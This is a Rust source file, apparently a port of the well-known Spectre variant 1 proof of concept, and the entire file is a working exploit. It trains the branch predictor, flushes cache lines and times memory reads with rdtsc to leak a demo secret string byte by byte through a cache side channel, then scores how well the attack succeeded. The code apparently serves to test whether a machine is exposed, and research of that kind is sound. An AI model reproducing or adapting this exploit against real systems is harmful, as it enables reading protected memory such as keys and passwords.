// --- ISA wrapper functions ---
// SSE2 requirements
#[cfg(all(target_arch = "x86_64"))]
use std::arch::x86_64::_mm_clflush;
use std::arch::x86_64::_mm_mfence;
use std::arch::x86_64::_mm_lfence;
// Other ISA wrappers
use std::arch::x86_64::_rdtsc;

// Used to exit main with a return value.
use std::process::exit;

// (Time elapsed <= threshold) => presuming cache hit.
const CACHE_HIT_THRESHOLD: i32 = 80;
const SUCCESS: i32 = 7;
const NUMBER_OF_ATTEMPTS: i32 = 10;
const ASCII_GUESSES_TO_SUCCEED: i32 = 3;
const PRINT_OUTPUT: bool = true;
const SECRET_STRING: &str = "The Magic Words are Squeamish Ossifrage.";
const SECRET_STRING_LENGTH: isize = 40;
const ASCII_LOWER_BOUND: u8 = 0x19;
const ASCII_UPPER_BOUND: u8 = 0x7f;

// ------------------------------------- Victim logic ----------------------------------------

pub struct VictimData {
    array1_size: u32,
    unused1: [u8; 64],
    array1: [u8; 160],
    unused2: [u8; 64],
    array2: [u8; 256 * 512],
    secret: [u8; 39],
    // Prevents victim_fn from being optimized out.
    temp: u8,
    x: usize,
}

#[no_mangle]
pub fn victim_gadget(victim: &mut VictimData)
{
    if victim.x < victim.array1_size as usize {
        victim.temp &= victim.array2[victim.array1[victim.x as usize] as usize * 512];
    }
}

// --------------------------------------- Analysis ------------------------------------------

/**
 *  The 'ad symbol serves as a lifetime specifier, here implying the references
 *  will stay alive at least as long as the AttackData struct.
 */
pub struct AttackData<'ad> {
    tries: &'ad mut i32,
    pass: &'ad mut i32,
    results: [i32; 256],
    value: [u8; 2],
    score: [i32; 2],
    training_x: i32,
    address_x: usize,
    temp: i32,
    junk: i32,
    mix_i: i32,
    time1: u64,
    time2: u64,
    addr_ptr: *const u8,
}

pub struct AttackInfo {
    ascii_guesses: i32,
    ascii_2nd_guesses: i32,
    correct_guesses: i32,
    correct_2nd_guesses: i32,
    discovered_string: [u8; SECRET_STRING_LENGTH as usize],
    secret_array_address: usize,
}

fn read_memory_byte(victim: &mut VictimData, attack: &mut AttackData)
{
    for i in 0..256 {
        attack.results[i] = 0;
    }
    for tries in (1..=999i32).rev() {
        *(*attack).tries = tries as i32;
        // Flush array2[256*(0..255)] from the cache.
        // UNSAFE section
        for i in 0..256isize {
            unsafe {
                _mm_clflush(&mut victim.array2[i as usize * 512]);
            }
        }
        // Run 5 trainings (x = address_x) per attack.
        attack.training_x = tries % victim.array1_size as i32;
        for pass in (00..=29i32).rev() {
            *(*attack).pass = pass;
            // UNSAFE section
            unsafe {
                _mm_clflush(&mut (victim.array1_size as u8));
            }
            // Delay, we use redundant for looping here.
            for _z in 0..100 {}
            unsafe {
                _mm_mfence();
            }
            set_x(victim, attack);
            // Call the victim.
            victim_gadget(victim);
        }
        if time_read(victim, attack) == SUCCESS {
            break;
        }
    }
    // Use redundant logic to prevent preceding code from being optimized out.
    attack.results[0] ^= attack.junk as i32;
    attack.value[0] = *(*attack).pass as u8;
    attack.score[0] = attack.results[*(*attack).pass as usize];
    attack.value[1] = attack.temp as u8;
    attack.score[1] = attack.results[attack.temp as usize];
}

#[inline]
fn set_x(victim: &mut VictimData, attack: &mut AttackData)
{
    /*
     * Avoid jumps in case those tip off the branch predictor.
     * Prepare x = fff.ff0000 if attack.pass % 6 == 0, else set x = 0.
     * ! in this case equivalent to C ~
     */
    victim.x = ((((*(*attack).pass) % 6) - 1) & !0xffff) as usize;
    // Set x = -1 if attack.pass % 6 == 0, else x = 0.
    victim.x = victim.x | (victim.x >> 16);
    // Set x = address_x if attack.pass & 6 == 0, else set x = training_x.
    victim.x = attack.training_x as usize ^ (victim.x as usize &
        (attack.address_x ^ attack.training_x as usize));
}

fn time_read(victim: &mut VictimData, attack: &mut AttackData) -> i32
{
    // Mixed-up order to prevent stride prediction
    for i in 0..256 {
        attack.mix_i = ((i * 167) + 13) & 255;
        attack.addr_ptr = &victim.array2[attack.mix_i as usize * 512] as *const u8;
        // UNSAFE section
        unsafe {
            _mm_lfence();
            attack.time1 = _rdtsc() as u64;
            // Time memory access.
            attack.junk = std::ptr::read_volatile(attack.addr_ptr) as i32;
            _mm_lfence();
            // Compute elapsed time.
            attack.time2 = _rdtsc() as u64 - attack.time1;
        }
        if (attack.time2 <= CACHE_HIT_THRESHOLD as u64) &&
            (attack.mix_i != victim.array1[(*(*attack).tries %
                victim.array1_size as i32) as usize] as i32) {
            // Cache hit -> score +1 for this value.
            attack.results[attack.mix_i as usize] += 1;
        }
    }
    if locate_results(attack) == SUCCESS {
        return SUCCESS;
    }
    return 0;
}

fn locate_results(attack: &mut AttackData) -> i32
{
    // Locate the highest & second highest results.
    attack.temp = -1;
    *(*attack).pass = attack.temp;
    for i in 0..256 {
        if (*(*attack).pass < 0) || (attack.results[i as usize] >=
            attack.results[*(*attack).pass as usize]) {
            attack.temp = *(*attack).pass as i32;
            *(*attack).pass = i;
        }
        else if (attack.temp < 0) || (attack.results[i as usize] >=
            attack.results[attack.temp as usize]) {
            attack.temp = i as i32;
        }
    }
    if (attack.results[*(*attack).pass as usize] >=
        (2 * attack.results[attack.temp as usize] + 5)) ||
        ((attack.results[*(*attack).pass as usize] == 2) &&
            (attack.results[attack.temp as usize] == 0)) {
        // Success if best is > 2 * runner-up + 5 or 2|0
        return SUCCESS;
    }
    return 0;
}

fn attempt_attack(attack_info: &mut AttackInfo)
{
    // Victim and attack data struct initializations
    let mut victim = VictimData {
        array1_size: 16,
        unused1: [0; 64],
        array1: [1; 160],
        unused2: [0; 64],
        array2: [0; 256 * 512],
        secret: [0; 39],
        temp: 0,
        x: 0,
    };
    let mut attack = AttackData {
        tries: &mut 0,
        pass: &mut 0,
        results: [0; 256],
        value: [0; 2],
        score: [0; 2],
        training_x: 0,
        address_x: 0,
        temp: 0,
        junk: 0,
        mix_i: 0,
        time1: 0,
        time2: 0,
        addr_ptr: std::ptr::null(),
    };
    let mut len: isize = SECRET_STRING_LENGTH;
    // Initialize array1.
    for i in 0..16u8 {
        victim.array1[i as usize] = i + 1;
    }
    // Fill the secret string.
    for i in 0..victim.secret.len() {
        victim.secret[i] = SECRET_STRING.as_bytes()[i];
    }
    // Write to array2 to ensure it is memory backed.
    // UNSAFE section
    for i in 0..victim.array2.len() {
        unsafe {
            std::ptr::write_volatile(&mut victim.array2[i], 1);
        }
    }

    // Default for address_x
    // We avoid an unsafe block here using the usize data type instead of ptr.
    attack.address_x = victim.secret.as_ptr() as usize;
    attack.address_x -= victim.array1.as_ptr() as usize;
    // Set the string discovered in the attack.
    attack_info.secret_array_address = victim.secret.as_ptr() as usize;
    if PRINT_OUTPUT {
        println!("Secret array location: {:p}", victim.secret.as_ptr());
        print!("Reading {} bytes:\n", len);
    }
    while len > 0 {
        if PRINT_OUTPUT {
            print!("Reading at address_x = {:p}... ", attack.address_x as *const isize);
        }
        read_memory_byte(&mut victim, &mut attack);
        attack.address_x += 1;
        let success = if (attack.score[0] - attack.score[1]).abs() >= 1 &&
                                attack.score[1] > 0 && attack.score[0] > 0 { "Plausible" }
                                                                      else { " Unlikely" };
        if PRINT_OUTPUT {
            print!("{}: ", success);
        }
        // Heuristic for common error guesses -> swap the first and second guess.
        // Assuming ASCII target string.
        if (attack.score[0] == 0x00) || (attack.score[0] == 0xC8) {
            let temp = attack.score[1];
            attack.score[1] = attack.score[0];
            attack.score[0] = temp;
            let temp2 = attack.value[1];
            attack.value[1] = attack.value[0];
            attack.value[0] = temp2;
        }

        if PRINT_OUTPUT {
            print!("0x{:02X}=’{}’ score={} ",
                   attack.value[0],
                   // Not in ASCII byte value range => print '?'.
                   if attack.value[0] > 31 && attack.value[0] < 127
                   { attack.value[0] as char } else { '?' },
                   attack.score[0]);
            if attack.score[1] > 0 {
                print!("(Second best: 0x{:02X}=’{}’ score={})", attack.value[1],
                       // Not in ASCII byte value range => print '?'.
                       if attack.value[1] > 31 && attack.value[1] < 127
                       { attack.value[1] as char } else { '?' }
                       , attack.score[1]);
            }
            print!("\n");
        }

        // Note the character discovered when it fits into the common ASCII range.
        if attack.value[0] > ASCII_LOWER_BOUND && attack.value[0] < ASCII_UPPER_BOUND {
            attack_info.discovered_string[(SECRET_STRING_LENGTH - len) as usize] = attack.value[0];
            attack_info.ascii_guesses += 1;
            // Compare the value found with the actual value to evaluate the guess in tests.
            if attack.value[0] == SECRET_STRING.as_bytes()[(SECRET_STRING_LENGTH - len) as usize] {
                attack_info.correct_guesses += 1;
            }
        }
        else if attack.value[1] > ASCII_LOWER_BOUND && attack.value[1] < ASCII_UPPER_BOUND {
            attack_info.discovered_string[(SECRET_STRING_LENGTH - len) as usize] = attack.value[1];
            attack_info.ascii_2nd_guesses += 1;
            if attack.value[1] == SECRET_STRING.as_bytes()[(SECRET_STRING_LENGTH - len) as usize] {
                attack_info.correct_2nd_guesses += 1;
            }
        }
        len -= 1;
    }
}

fn main()
{
    let mut total_guesses: i32 = 0;
    let total_correct;
    let mut unsuccessful_runs = 0;
    let mut successful_runs = 0;
    let mut attack_info = AttackInfo {
        ascii_guesses: 0,
        ascii_2nd_guesses: 0,
        correct_guesses: 0,
        correct_2nd_guesses: 0,
        discovered_string: [0; SECRET_STRING_LENGTH as usize],
        secret_array_address: 0,
    };
    let mut return_code = 1;

    for i in 0..NUMBER_OF_ATTEMPTS {
        if PRINT_OUTPUT {
            println!("--- Run number: {} ---", i + 1);
        }
        let prev_total_ascii = attack_info.ascii_guesses
            + attack_info.ascii_2nd_guesses;
        attempt_attack(&mut attack_info);
        total_guesses += SECRET_STRING_LENGTH as i32;
        let total_ascii = attack_info.ascii_guesses +  attack_info.ascii_2nd_guesses;
        if total_ascii - prev_total_ascii >= ASCII_GUESSES_TO_SUCCEED {
            successful_runs += 1;
        }
        else {
            unsuccessful_runs += 1;
            // Unsuccessful on the 1st attempt => relaunch the attack.
            if i == 0i32 {
                if PRINT_OUTPUT {
                    println!("\nThis attack will likely not succeed => quitting.");
                    println!("(Too few characters in the ASCII range.)\n");
                }
                println!("Result: FAIL {}", attack_info.secret_array_address);
                exit(return_code);
            }
        }
    }

    if PRINT_OUTPUT {
        println!("--- TESTING DONE ---");
        println!("Attempts: {}", total_guesses);
        println!("ASCII guesses: {}", attack_info.ascii_guesses);
        println!("Correct guesses: {}", attack_info.correct_guesses);
        println!("Second ASCII guesses: {}", attack_info.ascii_2nd_guesses);
        println!("Correct second guesses: {}", attack_info.correct_2nd_guesses);
        total_correct = attack_info.correct_guesses + attack_info.correct_2nd_guesses;
        print!("Total: {} out of {} correct", total_correct, total_guesses);
        print!(" = {:.10}%\n", total_correct as f32 / total_guesses as f32 * 100 as f32);
        let avg_until_success = unsuccessful_runs as f32 / successful_runs as f32;
        println!("Succesful runs: {} Faulty runs: {}", successful_runs, unsuccessful_runs);
        println!("Average faulty runs until success: {:.10}", avg_until_success);
        if successful_runs < unsuccessful_runs {
            println!("The environment seems not to have been set up ideally for the attack.");
        } else {
            println!("The environment seems to have been set up ideally for the attack.");
            return_code = 0;
        }
        println!();
        println!("--- Original string ---");
        println!("{}", SECRET_STRING);
        println!("--- Discovered string ---");
        for i in 0usize..SECRET_STRING_LENGTH as usize {
            // If the character discovered is in the ASCII range
            if attack_info.discovered_string[i] > ASCII_LOWER_BOUND
                && attack_info.discovered_string[i] < ASCII_UPPER_BOUND {
                print!("{}", attack_info.discovered_string[i] as char);
            } else {
                print!("?");
            }
        }
        println!();
        // Print the collected address for later analysis.
        println!("--> Result, secret array address <--");
    }

    if successful_runs < unsuccessful_runs {
        println!("Result: FAILURE {}", attack_info.secret_array_address);
    }
    else {
        println!("Result: SUCCESS {}", attack_info.secret_array_address);
    }
    exit(return_code);
}
